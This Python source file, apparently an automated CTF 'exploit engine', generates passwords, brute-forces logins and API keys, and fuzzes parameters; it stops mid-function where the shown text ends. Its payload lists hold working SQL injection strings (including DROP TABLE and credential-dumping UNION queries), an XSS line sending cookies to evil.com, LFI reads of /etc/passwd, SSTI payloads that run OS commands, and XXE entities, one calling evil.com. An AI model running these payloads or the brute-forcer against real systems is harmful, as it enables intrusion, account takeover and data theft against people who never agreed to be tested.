"""
================================================================================
MD-EXPLOIT-ENGINE - CTF Brain (AI-Powered Learning System)
================================================================================
Developed by: Md Abu Shalem Alam
Description: ULTRA POWERFUL AI-Powered Learning System for CTF Challenges
Features:
- Pattern learning from solved challenges
- Smart password generation
- Technique suggestion
- Flag validation
- AURA+++ MODE - Maximum Power CTF Solver
================================================================================
"""

__author__ = "Md Abu Shalem Alam"

import json
import os
import re
import hashlib
import sqlite3
import base64
import struct
import zlib
from typing import Dict, List, Optional, Any, Tuple, Set
from datetime import datetime
from collections import Counter, defaultdict
import itertools
import string
import math


class CTFBrain:
    """
    ULTRA AI-powered CTF solving brain that learns from experience.
    Stores patterns, solutions, and learns to predict flag locations.
    """
    
    def __init__(self, db_path: str = "data/ctf_brain.db"):
        self.db_path = db_path
        self._init_database()
        self._load_knowledge()
        
        # Pattern weights (learned over time)
        self.pattern_weights = {
            'base64_in_comment': 0.95,
            'xor_array': 0.90,
            'caesar_cipher': 0.85,
            'morse_code': 0.80,
            'api_endpoint': 0.75,
            'hidden_path': 0.70,
            'steganography': 0.65,
            'hash_crack': 0.60,
            'jwt_token': 0.85,
            'sql_injection': 0.80,
            'command_injection': 0.75,
            'lfi': 0.70,
            'ssti': 0.75,
            'xxe': 0.65,
            'ssrf': 0.60,
            'prototype_pollution': 0.55,
            'deserialization': 0.70,
            'race_condition': 0.50,
        }

        # MASSIVE password patterns database
        self.password_patterns = [
            # Simple words
            'flag', 'admin', 'password', 'secret', 'hidden', 'key', 'root', 'user',
            'test', 'demo', 'guest', 'login', 'master', 'super', 'backup', 'temp',
            # CTF specific
            'ctf', 'capture', 'theflag', 'findme', 'hackme', 'pwned', 'hacked',
            'exploit', 'shell', 'reverse', 'payload', 'inject', 'bypass', 'crack',
            # Numbers
            '123', '1234', '12345', '123456', '1337', '2024', '2025', '31337',
            '0000', '1111', '9999', '4321', '0123', '6969', '1234567890',
            # Common combinations
            'admin123', 'password123', 'flag123', 'secret123', 'root123',
            'admin@123', 'P@ssw0rd', 'p@ssword', 'letmein', 'welcome',
            'qwerty', 'abc123', 'monkey', 'dragon', 'master', 'shadow',
            # CTF themed
            'flag{', 'CTF{', 'picoCTF', 'HTB{', 'THM{', 'CSBC{', 'csbc',
            'capture_the_flag', 'find_the_flag', 'get_flag', 'read_flag',
        ]
        
        # Encoding detection patterns
        self.encoding_signatures = {
            'base64': r'^[A-Za-z0-9+/]{4,}={0,2}$',
            'base32': r'^[A-Z2-7]{8,}={0,6}$',
            'hex': r'^[0-9a-fA-F]{8,}$',
            'binary': r'^[01\s]{8,}$',
            'morse': r'^[\.\-\s/]+$',
            'rot13': r'^[A-Za-z\s]+$',
            'url': r'%[0-9a-fA-F]{2}',
            'unicode': r'\\u[0-9a-fA-F]{4}',
            'octal': r'\\[0-7]{3}',
        }
        
        # Challenge type signatures - EXPANDED
        self.challenge_signatures = {
            'terminal': ['terminal', 'console', 'command', 'shell', 'bash', 'cmd', 'exec'],
            'login': ['login', 'password', 'authenticate', 'credentials', 'signin', 'auth'],
            'puzzle': ['puzzle', 'riddle', 'clue', 'hint', 'fragment', 'piece', 'mystery'],
            'crypto': ['encrypt', 'decrypt', 'cipher', 'encode', 'decode', 'hash', 'rsa', 'aes'],
            'steganography': ['image', 'hidden', 'steganography', 'lsb', 'png', 'jpg', 'exif'],
            'api': ['api', 'endpoint', 'fetch', 'request', 'json', 'rest', 'graphql'],
            'web': ['sql', 'injection', 'xss', 'csrf', 'lfi', 'rfi', 'ssrf', 'ssti'],
            'forensics': ['forensic', 'memory', 'disk', 'pcap', 'wireshark', 'volatility'],
            'reversing': ['reverse', 'binary', 'assembly', 'disassemble', 'decompile', 'ghidra'],
            'pwn': ['pwn', 'exploit', 'buffer', 'overflow', 'rop', 'shellcode', 'heap'],
            'osint': ['osint', 'social', 'recon', 'google', 'search', 'dork', 'metadata'],
            'misc': ['misc', 'trivia', 'random', 'fun', 'game', 'quiz'],
        }
        
        # Vulnerability signatures for auto-detection
        self.vuln_signatures = {
            'sqli': [r"'", r'"', r'--', r'union', r'select', r'from', r'where', r'or 1=1'],
            'xss': [r'<script', r'onerror', r'onload', r'javascript:', r'alert('],
            'lfi': [r'\.\./', r'%2e%2e', r'file=', r'path=', r'include=', r'page='],
            'ssti': [r'\{\{', r'\$\{', r'<%=', r'#{', r'*{'],
            'cmd': [r';', r'|', r'`', r'$(', r'&&', r'||'],
            'xxe': [r'<!DOCTYPE', r'<!ENTITY', r'SYSTEM', r'file://'],
        }

    def _init_database(self):
        """Initialize the learning database"""
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Solved challenges table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS solved_challenges (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE,
                url_hash TEXT,
                challenge_type TEXT,
                flag TEXT,
                method TEXT,
                patterns_found TEXT,
                fragments TEXT,
                password TEXT,
                solve_time REAL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Patterns table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS learned_patterns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                pattern_type TEXT UNIQUE,
                pattern_regex TEXT,
                success_count INTEGER DEFAULT 0,
                fail_count INTEGER DEFAULT 0,
                weight REAL DEFAULT 0.5,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Password patterns table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS password_patterns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                password TEXT UNIQUE,
                challenge_type TEXT,
                success_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Fragment combinations table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS fragment_combinations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                fragments TEXT,
                separator TEXT,
                order_pattern TEXT,
                success_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Vulnerability patterns table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vuln_patterns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                vuln_type TEXT,
                payload TEXT,
                success_count INTEGER DEFAULT 0,
                target_param TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def _load_knowledge(self):
        """Load learned knowledge from database"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Load successful passwords
            cursor.execute('''
                SELECT password, success_count FROM password_patterns 
                WHERE success_count > 0 ORDER BY success_count DESC
            ''')
            for row in cursor.fetchall():
                if row[0] not in self.password_patterns:
                    self.password_patterns.insert(0, row[0])
            
            # Load pattern weights
            cursor.execute('''
                SELECT pattern_type, weight FROM learned_patterns 
                WHERE success_count > 0
            ''')
            for row in cursor.fetchall():
                self.pattern_weights[row[0]] = row[1]
            
            conn.close()
        except:
            pass

    def learn_from_solution(self, url: str, flag: str, method: str, 
                           patterns: List[str] = None, fragments: List[str] = None,
                           password: str = None, solve_time: float = 0):
        """Learn from a successfully solved challenge"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        url_hash = hashlib.md5(url.encode()).hexdigest()
        challenge_type = self._classify_challenge(url, patterns or [])
        
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO solved_challenges 
                (url, url_hash, challenge_type, flag, method, patterns_found, fragments, password, solve_time)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (url, url_hash, challenge_type, flag, method, 
                  json.dumps(patterns or []), json.dumps(fragments or []), 
                  password, solve_time))
            
            # Update pattern weights
            if patterns:
                for pattern in patterns:
                    cursor.execute('''
                        INSERT OR REPLACE INTO learned_patterns (pattern_type, pattern_regex, success_count, weight)
                        VALUES (?, ?, 1, 0.6)
                    ''', (pattern, pattern))
            
            # Learn password pattern
            if password:
                cursor.execute('''
                    INSERT OR REPLACE INTO password_patterns (password, challenge_type, success_count)
                    VALUES (?, ?, 1)
                ''', (password, challenge_type))
            
            conn.commit()
        except Exception as e:
            pass
        finally:
            conn.close()
    
    def train_from_history(self) -> Dict[str, Any]:
        """Train the model from past solved challenges to improve pattern recognition"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        training_stats = {
            'challenges_analyzed': 0,
            'patterns_learned': 0,
            'methods_analyzed': {},
            'improved_weights': []
        }
        
        try:
            # Get all solved challenges
            cursor.execute('''
                SELECT url, flag, method, patterns_found, password, solve_time 
                FROM solved_challenges
            ''')
            challenges = cursor.fetchall()
            training_stats['challenges_analyzed'] = len(challenges)
            
            # Analyze methods and their success rates
            method_counts = {}
            method_times = {}
            for row in challenges:
                method = row[2]
                solve_time = row[5] or 0
                
                if method not in method_counts:
                    method_counts[method] = 0
                    method_times[method] = []
                
                method_counts[method] += 1
                if solve_time > 0:
                    method_times[method].append(solve_time)
            
            training_stats['methods_analyzed'] = method_counts
            
            # Update pattern weights based on success rates
            for method, count in method_counts.items():
                if count >= 3:  # Only update if we have enough data
                    # Calculate new weight based on success count and solve time
                    avg_time = sum(method_times.get(method, [60])) / max(len(method_times.get(method, [1])), 1)
                    
                    # Faster methods get higher weights
                    time_factor = max(0.3, 1.0 - (avg_time / 120))  # 0.3 to 1.0 based on time
                    count_factor = min(1.0, count / 10)  # 0.1 to 1.0 based on count
                    
                    new_weight = 0.5 + (time_factor * 0.3) + (count_factor * 0.2)
                    
                    # Map method to pattern type
                    pattern_type = method.replace('_check_', '').replace('_test_', '')
                    
                    cursor.execute('''
                        INSERT OR REPLACE INTO learned_patterns 
                        (pattern_type, pattern_regex, success_count, weight)
                        VALUES (?, ?, ?, ?)
                    ''', (pattern_type, pattern_type, count, new_weight))
                    
                    self.pattern_weights[pattern_type] = new_weight
                    training_stats['improved_weights'].append({
                        'pattern': pattern_type,
                        'weight': new_weight,
                        'count': count
                    })
                    training_stats['patterns_learned'] += 1
            
            # Learn from successful passwords
            cursor.execute('''
                SELECT password, COUNT(*) as cnt FROM solved_challenges 
                WHERE password IS NOT NULL AND password != ''
                GROUP BY password ORDER BY cnt DESC
            ''')
            for row in cursor.fetchall():
                pwd, cnt = row
                if pwd and pwd not in self.password_patterns:
                    self.password_patterns.insert(0, pwd)
                    cursor.execute('''
                        INSERT OR REPLACE INTO password_patterns 
                        (password, challenge_type, success_count)
                        VALUES (?, 'learned', ?)
                    ''', (pwd, cnt))
            
            conn.commit()
            
        except Exception as e:
            training_stats['error'] = str(e)
        finally:
            conn.close()
        
        return training_stats
    
    def _classify_challenge(self, url: str, patterns: List[str]) -> str:
        """Classify the challenge type based on URL and patterns"""
        url_lower = url.lower()
        
        for ctype, keywords in self.challenge_signatures.items():
            if any(kw in url_lower for kw in keywords):
                return ctype
            if any(kw in ' '.join(patterns).lower() for kw in keywords):
                return ctype
        
        return 'unknown'
    
    def detect_encoding(self, text: str) -> List[str]:
        """Detect possible encodings of a string"""
        encodings = []
        text = text.strip()
        
        for enc_type, pattern in self.encoding_signatures.items():
            if re.match(pattern, text):
                encodings.append(enc_type)
        
        # Additional heuristics
        if len(text) % 4 == 0 and re.match(r'^[A-Za-z0-9+/]+={0,2}$', text):
            if 'base64' not in encodings:
                encodings.append('base64')
        
        if all(c in '0123456789abcdefABCDEF' for c in text) and len(text) % 2 == 0:
            if 'hex' not in encodings:
                encodings.append('hex')
        
        return encodings
    
    def detect_vulnerabilities(self, html: str, js_content: str) -> List[Dict]:
        """Detect potential vulnerabilities in web content"""
        vulns = []
        combined = html + '\n' + js_content
        
        # Check for SQL injection points
        sql_patterns = [
            r'<input[^>]*name=["\'](\w*(?:id|user|name|query|search|q)\w*)["\']',
            r'\?(\w+)=',
            r'SELECT.*FROM',
            r'INSERT INTO',
        ]
        for pattern in sql_patterns:
            if re.search(pattern, combined, re.IGNORECASE):
                vulns.append({'type': 'sqli', 'confidence': 0.7})
                break
        
        # Check for XSS points
        xss_patterns = [
            r'innerHTML\s*=',
            r'document\.write\s*\(',
            r'\.html\s*\(',
            r'eval\s*\(',
        ]
        for pattern in xss_patterns:
            if re.search(pattern, combined, re.IGNORECASE):
                vulns.append({'type': 'xss', 'confidence': 0.6})
                break
        
        # Check for LFI points
        lfi_patterns = [
            r'\?(?:file|path|page|include|doc|document|folder|root|pg)=',
            r'include\s*\(',
            r'require\s*\(',
            r'file_get_contents\s*\(',
        ]
        for pattern in lfi_patterns:
            if re.search(pattern, combined, re.IGNORECASE):
                vulns.append({'type': 'lfi', 'confidence': 0.65})
                break
        
        # Check for SSTI
        ssti_patterns = [
            r'\{\{.*\}\}',
            r'\$\{.*\}',
            r'<%.*%>',
            r'render_template',
            r'jinja',
            r'twig',
        ]
        for pattern in ssti_patterns:
            if re.search(pattern, combined, re.IGNORECASE):
                vulns.append({'type': 'ssti', 'confidence': 0.6})
                break
        
        # Check for command injection
        cmd_patterns = [
            r'exec\s*\(',
            r'system\s*\(',
            r'shell_exec\s*\(',
            r'popen\s*\(',
            r'subprocess',
            r'os\.system',
        ]
        for pattern in cmd_patterns:
            if re.search(pattern, combined, re.IGNORECASE):
                vulns.append({'type': 'cmd_injection', 'confidence': 0.7})
                break
        
        return vulns

    def generate_passwords(self, context: Dict[str, Any], max_count: int = 5000) -> List[str]:
        """Generate ULTRA intelligent password guesses based on context"""
        passwords = []
        
        # Start with learned successful passwords
        passwords.extend(self.password_patterns[:100])
        
        # Extract context clues
        hints = context.get('hints', [])
        fragments = context.get('fragments', [])
        keywords = context.get('keywords', [])
        numbers = context.get('numbers', [])
        
        # Generate from hints - ENHANCED
        for hint in hints:
            words = re.findall(r'\b[a-zA-Z]{3,}\b', hint)
            for word in words:
                passwords.extend([
                    word.lower(), word.upper(), word.capitalize(),
                    word.lower() + '123', word.lower() + '!',
                    word.lower() + '@', word.lower() + '#',
                ])
        
        # Generate from fragments - ALL PERMUTATIONS
        if fragments:
            separators = ['-', '_', '', '.', ':', '+', ' ', '/', '|', '@']
            for sep in separators:
                for r in range(1, min(len(fragments) + 1, 6)):
                    for perm in itertools.permutations(fragments, r):
                        passwords.append(sep.join(perm))
                        # Reverse order
                        passwords.append(sep.join(reversed(perm)))
        
        # Generate from keywords with mutations
        for kw in keywords:
            passwords.extend(self._mutate_word(kw))
        
        # Generate from numbers
        for num in numbers:
            passwords.append(num)
            passwords.append(f"flag{num}")
            passwords.append(f"ctf{num}")
            passwords.append(f"key{num}")
        
        # Leet speak transformations
        base_passwords = passwords[:200]
        for pwd in base_passwords:
            passwords.append(self._to_leet(pwd))
        
        # Common CTF password patterns
        ctf_patterns = [
            'flag', 'FLAG', 'ctf', 'CTF', 'key', 'KEY', 'secret', 'SECRET',
            'password', 'admin', 'root', 'user', 'test', 'demo',
        ]
        for pattern in ctf_patterns:
            for suffix in ['', '1', '123', '!', '@', '#', '2024', '2025']:
                passwords.append(f"{pattern}{suffix}")
        
        # Remove duplicates and limit
        seen = set()
        unique = []
        for p in passwords:
            if p and p not in seen and len(p) >= 1:
                seen.add(p)
                unique.append(p)
                if len(unique) >= max_count:
                    break
        
        return unique
    
    def _mutate_word(self, word: str) -> List[str]:
        """Generate mutations of a word"""
        mutations = [
            word.lower(),
            word.upper(),
            word.capitalize(),
            word.swapcase(),
            word[::-1],  # Reverse
            word + '123',
            word + '!',
            word + '@',
            word + '#',
            word + '1',
            '123' + word,
            word.replace('a', '@').replace('e', '3').replace('i', '1').replace('o', '0'),
            word.replace('s', '$').replace('a', '4'),
        ]
        return mutations
    
    def _to_leet(self, text: str) -> str:
        """Convert text to leet speak"""
        leet_map = {
            'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5',
            'A': '4', 'E': '3', 'I': '1', 'O': '0', 'S': '5',
            't': '7', 'T': '7', 'l': '1', 'L': '1',
        }
        return ''.join(leet_map.get(c, c) for c in text)

    def analyze_challenge(self, html: str, js_content: str) -> Dict[str, Any]:
        """ULTRA analyze a challenge and extract ALL useful information"""
        analysis = {
            'hints': [],
            'fragments': [],
            'keywords': [],
            'numbers': [],
            'patterns_detected': [],
            'challenge_type': 'unknown',
            'confidence': 0.0,
            'suggested_techniques': [],
            'vulnerabilities': [],
            'encodings_found': [],
            'hidden_paths': [],
            'api_endpoints': [],
            'forms': [],
            'cookies': [],
            'headers': [],
        }
        
        combined = html + '\n' + js_content
        
        # Extract HTML comments as hints
        comments = re.findall(r'<!--\s*(.*?)\s*-->', html, re.DOTALL)
        analysis['hints'].extend([c.strip() for c in comments if len(c.strip()) > 3])
        
        # Extract JS comments as hints
        js_comments = re.findall(r'//\s*([^\n]+)', js_content)
        js_comments.extend(re.findall(r'/\*\s*(.*?)\s*\*/', js_content, re.DOTALL))
        analysis['hints'].extend([c.strip() for c in js_comments if len(c.strip()) > 3])
        
        # Detect XOR arrays
        xor_arrays = re.findall(r'(?:const|let|var)\s+(\w*(?:encoded|fragment|key|secret|data)\w*)\s*=\s*\[([0-9,\s]+)\]', js_content, re.IGNORECASE)
        if xor_arrays:
            analysis['patterns_detected'].append('xor_array')
            for name, arr in xor_arrays:
                nums = [int(n.strip()) for n in arr.split(',') if n.strip().isdigit()]
                analysis['fragments'].append({'type': 'xor', 'name': name, 'data': nums})
        
        # Detect Base64 in comments and code
        b64_patterns = [
            r'(?:BASE64|B64|ENCODED)[_\s:]*([A-Za-z0-9+/=]{8,})',
            r'atob\s*\(\s*[\'"]([A-Za-z0-9+/=]{8,})[\'"]',
            r'[\'"]([A-Za-z0-9+/]{20,}={0,2})[\'"]',
        ]
        for pattern in b64_patterns:
            matches = re.findall(pattern, combined, re.IGNORECASE)
            if matches:
                analysis['patterns_detected'].append('base64_encoded')
                analysis['encodings_found'].extend([{'type': 'base64', 'data': m} for m in matches])
        
        # Detect API endpoints
        api_patterns = [
            r'fetch\s*\(\s*[\'"]([^\'"]+)[\'"]',
            r'axios\.[a-z]+\s*\(\s*[\'"]([^\'"]+)[\'"]',
            r'\.ajax\s*\(\s*\{[^}]*url\s*:\s*[\'"]([^\'"]+)[\'"]',
            r'XMLHttpRequest[^;]*open\s*\([^,]*,\s*[\'"]([^\'"]+)[\'"]',
        ]
        for pattern in api_patterns:
            matches = re.findall(pattern, combined, re.IGNORECASE)
            analysis['api_endpoints'].extend(matches)
        
        # Detect forms
        forms = re.findall(r'<form[^>]*action=[\'"]([^\'"]*)[\'"][^>]*>', html, re.IGNORECASE)
        analysis['forms'].extend(forms)
        
        # Detect hidden paths
        path_patterns = [
            r'href=[\'"]([^\'"]*(?:admin|secret|flag|hidden|backup|config)[^\'"]*)[\'"]',
            r'src=[\'"]([^\'"]*\.(?:php|asp|jsp|py|js))[\'"]',
            r'[\'"](/[a-zA-Z0-9_/-]+\.(?:php|txt|html|json))[\'"]',
        ]
        for pattern in path_patterns:
            matches = re.findall(pattern, combined, re.IGNORECASE)
            analysis['hidden_paths'].extend(matches)
        
        # Detect password/login forms
        if re.search(r'<input[^>]*type=["\']password["\']', html, re.IGNORECASE):
            analysis['patterns_detected'].append('login_form')
            analysis['challenge_type'] = 'login'
        
        # Extract keywords from title and headers
        title_match = re.search(r'<title>([^<]+)</title>', html, re.IGNORECASE)
        if title_match:
            analysis['keywords'].extend(re.findall(r'\b[a-zA-Z]{4,}\b', title_match.group(1)))
        
        # Extract all numbers
        analysis['numbers'] = list(set(re.findall(r'\b\d{2,}\b', combined)))
        
        # Detect vulnerabilities
        analysis['vulnerabilities'] = self.detect_vulnerabilities(html, js_content)
        
        # Calculate confidence
        if analysis['patterns_detected']:
            weights = [self.pattern_weights.get(p, 0.5) for p in analysis['patterns_detected']]
            analysis['confidence'] = sum(weights) / len(weights)
        
        # Suggest techniques based on findings
        if 'xor_array' in analysis['patterns_detected']:
            analysis['suggested_techniques'].append('xor_decode')
        if 'base64_encoded' in analysis['patterns_detected']:
            analysis['suggested_techniques'].append('base64_decode')
        if analysis['api_endpoints']:
            analysis['suggested_techniques'].append('api_fuzzing')
        if 'login_form' in analysis['patterns_detected']:
            analysis['suggested_techniques'].append('password_bruteforce')
        for vuln in analysis['vulnerabilities']:
            analysis['suggested_techniques'].append(f"{vuln['type']}_exploit")
        
        return analysis

    def get_similar_challenges(self, url: str, patterns: List[str]) -> List[Dict]:
        """Find similar solved challenges"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        similar = []
        
        for pattern in patterns:
            cursor.execute('''
                SELECT url, flag, method, password, patterns_found 
                FROM solved_challenges 
                WHERE patterns_found LIKE ?
                LIMIT 5
            ''', (f'%{pattern}%',))
            
            for row in cursor.fetchall():
                similar.append({
                    'url': row[0],
                    'flag': row[1],
                    'method': row[2],
                    'password': row[3],
                    'patterns': json.loads(row[4]) if row[4] else []
                })
        
        conn.close()
        return similar
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get learning statistics"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        stats = {}
        
        cursor.execute('SELECT COUNT(*) FROM solved_challenges')
        stats['total_solved'] = cursor.fetchone()[0]
        
        cursor.execute('SELECT challenge_type, COUNT(*) FROM solved_challenges GROUP BY challenge_type')
        stats['by_type'] = dict(cursor.fetchall())
        
        cursor.execute('SELECT method, COUNT(*) FROM solved_challenges GROUP BY method ORDER BY COUNT(*) DESC LIMIT 10')
        stats['top_methods'] = dict(cursor.fetchall())
        
        cursor.execute('SELECT AVG(solve_time) FROM solved_challenges WHERE solve_time > 0')
        stats['avg_solve_time'] = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM learned_patterns WHERE success_count > 0')
        stats['learned_patterns'] = cursor.fetchone()[0]
        
        conn.close()
        return stats
    
    def generate_payloads(self, vuln_type: str, context: Dict = None) -> List[str]:
        """Generate attack payloads for specific vulnerability types"""
        payloads = []
        
        if vuln_type == 'sqli':
            payloads = [
                "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "admin'--",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "1' ORDER BY 1--", "1' ORDER BY 10--",
                "' AND 1=1--", "' AND 1=2--",
                "'; DROP TABLE users--", "' OR ''='",
                "1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
                "' UNION SELECT username,password FROM users--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "-1' UNION SELECT 1,2,3--",
                "' OR 'x'='x", "') OR ('1'='1",
            ]
        
        elif vuln_type == 'xss':
            payloads = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                "'-alert(1)-'",
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '{{constructor.constructor("alert(1)")()}}',
                '<img src=x onerror="alert(document.cookie)">',
                '<script>fetch("http://evil.com?c="+document.cookie)</script>',
            ]
        
        elif vuln_type == 'lfi':
            payloads = [
                '../flag.txt', '../../flag.txt', '../../../flag.txt',
                '....//....//flag.txt', '..%2f..%2fflag.txt',
                '/etc/passwd', '....//....//etc/passwd',
                'php://filter/convert.base64-encode/resource=flag.txt',
                'php://filter/convert.base64-encode/resource=index.php',
                'php://input', 'file:///flag.txt', 'file:///etc/passwd',
                'data://text/plain,<?php system("cat /flag*"); ?>',
                '/proc/self/environ', '/var/log/apache2/access.log',
            ]
        
        elif vuln_type == 'ssti':
            payloads = [
                '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '*{7*7}',
                '{{config}}', '{{self.__class__.__mro__}}',
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
            ]
        
        elif vuln_type == 'cmd':
            payloads = [
                '; cat /flag*', '| cat /flag*', '`cat /flag*`', '$(cat /flag*)',
                '; ls -la', '| ls -la', '; id', '| id',
                '& type flag.txt', '| type flag.txt',
                '; cat /etc/passwd', '|| cat /flag*', '&& cat /flag*',
                '\n cat /flag*', '\r\n cat /flag*',
            ]
        
        elif vuln_type == 'xxe':
            payloads = [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
            ]
        
        return payloads


class SmartBruteforcer:
    """ULTRA Intelligent bruteforce engine that learns and adapts"""
    
    def __init__(self, brain: CTFBrain):
        self.brain = brain
        self.tried_passwords = set()
        self.tried_payloads = defaultdict(set)
    
    def bruteforce_login(self, login_func, context: Dict[str, Any], 
                        max_attempts: int = 10000, callback=None) -> Optional[str]:
        """Bruteforce a login with ULTRA intelligent password generation"""
        passwords = self.brain.generate_passwords(context, max_attempts)
        
        for i, password in enumerate(passwords):
            if password in self.tried_passwords:
                continue
            
            self.tried_passwords.add(password)
            
            if callback and i % 100 == 0:
                callback(f"Trying password {i}/{len(passwords)}: {password[:20]}...")
            
            try:
                if login_func(password):
                    self.brain.learn_from_solution(
                        url=context.get('url', 'unknown'),
                        flag=context.get('flag', ''),
                        method='bruteforce',
                        patterns=context.get('patterns', []),
                        password=password
                    )
                    return password
            except:
                continue
        
        return None
    
    def bruteforce_api(self, api_func, context: Dict[str, Any],
                      max_attempts: int = 5000, callback=None) -> Optional[Tuple[str, str]]:
        """Bruteforce an API endpoint with different keys"""
        keys = self.brain.generate_passwords(context, max_attempts)
        
        for i, key in enumerate(keys):
            if callback and i % 50 == 0:
                callback(f"Trying API key {i}/{len(keys)}: {key[:30]}...")
            
            try:
                success, response = api_func(key)
                if success:
                    flag = self._extract_flag(response)
                    if flag:
                        self.brain.learn_from_solution(
                            url=context.get('url', 'unknown'),
                            flag=flag,
                            method='api_bruteforce',
                            patterns=context.get('patterns', []),
                            password=key
                        )
                        return (key, flag)
            except:
                continue
        
        return None
    
    def fuzz_parameter(self, fuzz_func, param_name: str, vuln_type: str,
                      context: Dict = None, callback=None) -> Optional[Tuple[str, str]]:
        """Fuzz a parameter with vulnerability-specific payloads"""
        payloads = self.brain.generate_payloads(vuln_type, context)
        
        for i, payload in enumerate(payloads):
            if payload in self.tried_payloads[param_name]:
                continue
            
            self.tried_payloads[param_name].add(payload)
            
            if callback and i % 10 == 0:
                callback(f"Fuzzing {param_name} with {vuln_type} payload {i}/{len(payloads)}")
            
            try:
                success, response = fuzz_func(payload)
                if success:
                    flag = self._extract_flag(response)
                    if flag:
                        return (payload, flag)
            except:
                continue
        
        return None
    
    def _extract_flag(self, response: str) -> Optional[str]:
        """Extract flag from response - ENHANCED"""
        patterns = [
            r'FLAG\{[^}]+\}', r'flag\{[^}]+\}',
            r'CTF\{[^}]+\}', r'ctf\{[^}]+\}',
            r'CSBC\{[^}]+\}', r'csbc\{[^}]+\}',
            r'HTB\{[^}]+\}', r'THM\{[^}]+\}',
            r'picoCTF\{[^}]+\}', r'pico\{[^}]+\}',
            r'\w+Flag\{[^}]+\}', r'\w+CTF\{[^}]+\}',
            r'\w+\{[a-zA-Z0-9_-]+\}',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                return match.group(0)
        
        try:
            data = json.loads(response)
            for key in ['flag', 'Flag', 'FLAG', 'secret', 'key', 'answer']:
                if key in data:
                    return str(data[key])
        except:
            pass
        
        return None


class UltraDecoder:
    """ULTRA powerful decoder for all CTF encoding types"""
    
    @staticmethod
    def try_all_decodings(text: str) -> List[Tuple[str, str]]:
        """Try ALL possible decodings and return results"""
        results = []
        
        # Base64
        try:
            padded = text + '=' * (4 - len(text) % 4) if len(text) % 4 else text
            decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
            if decoded and len(decoded) > 2:
                results.append(('base64', decoded))
        except:
            pass
        
        # Base32
        try:
            padded = text.upper() + '=' * (8 - len(text) % 8) if len(text) % 8 else text.upper()
            decoded = base64.b32decode(padded).decode('utf-8', errors='ignore')
            if decoded and len(decoded) > 2:
                results.append(('base32', decoded))
        except:
            pass
        
        # Hex
        try:
            if all(c in '0123456789abcdefABCDEF' for c in text) and len(text) % 2 == 0:
                decoded = bytes.fromhex(text).decode('utf-8', errors='ignore')
                if decoded and len(decoded) > 2:
                    results.append(('hex', decoded))
        except:
            pass
        
        # ROT13
        try:
            import codecs
            decoded = codecs.decode(text, 'rot_13')
            if decoded != text:
                results.append(('rot13', decoded))
        except:
            pass
        
        # Caesar (all shifts)
        for shift in range(1, 26):
            decoded = UltraDecoder._caesar_decode(text, shift)
            if UltraDecoder._looks_english(decoded):
                results.append((f'caesar_{shift}', decoded))
                break
        
        # Atbash
        decoded = UltraDecoder._atbash_decode(text)
        if decoded != text and UltraDecoder._looks_english(decoded):
            results.append(('atbash', decoded))
        
        # Binary
        try:
            binary = text.replace(' ', '')
            if all(c in '01' for c in binary) and len(binary) % 8 == 0:
                decoded = ''.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))
                if decoded and len(decoded) > 2:
                    results.append(('binary', decoded))
        except:
            pass
        
        # URL decode
        try:
            import urllib.parse
            decoded = urllib.parse.unquote(text)
            if decoded != text:
                results.append(('url', decoded))
        except:
            pass
        
        # Reverse
        reversed_text = text[::-1]
        if reversed_text != text:
            results.append(('reverse', reversed_text))
        
        return results
    
    @staticmethod
    def _caesar_decode(text: str, shift: int) -> str:
        result = ''
        for ch in text:
            if ch.isalpha():
